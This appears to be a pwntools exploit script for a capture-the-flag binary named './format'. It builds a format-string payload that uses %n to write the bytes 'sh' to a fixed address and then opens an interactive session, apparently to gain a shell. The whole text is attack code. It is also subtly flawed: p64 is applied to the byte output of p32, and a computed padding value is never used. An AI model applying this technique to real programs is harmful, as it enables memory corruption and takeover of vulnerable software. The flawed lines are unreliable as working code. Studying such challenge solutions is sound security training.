from pwn import *

e = ELF('./format')

p = process('./format')

target_addr = p32(0x404060)
sh_val = 26739
offset_of_buf = 6
fmt_str = f"%{sh_val}c"

current_len = len(fmt_str) + 5
padding_len = 16 - current_len
target_offset = offset_of_buf + 2

payload_str = f"{fmt_str}%{target_offset}$n"
payload_str += "A" * (16 - len(payload_str))

payload = payload_str.encode() + p64(target_addr)

print(f"Độ dài payload: {len(payload)} bytes")

p.sendlineafter(b'Do you want to get flag^^', payload)

p.interactive()